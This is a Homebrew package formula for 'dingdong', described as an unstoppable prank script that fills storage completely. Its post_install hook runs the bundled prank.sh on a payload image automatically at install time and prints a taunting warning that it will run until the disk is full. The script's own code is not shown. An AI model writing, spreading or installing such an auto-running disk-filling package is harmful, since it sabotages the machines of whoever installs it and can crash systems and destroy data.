class Dingdong < Formula
  desc "An unstoppable prank script that fills storage completely"
  homepage "https://github.com/punkkkkkkk/dingdong"
  url "https://github.com/punkkkkkkk/dingdong/archive/refs/heads/main.zip"
  version "2.1.0"
  sha256 "REPLACE_WITH_NEW_HASH_AFTER_UPDATING"

  def install
    bin.install "prank.sh"
    pkgshare.install "payload.png"
  end

  def post_install
    ohai "⚠️  WARNING: This will run until disk is full! hahaha hahaha got ya 👺 "
    system "#{bin}/prank.sh #{pkgshare}/payload.png"
  end
end
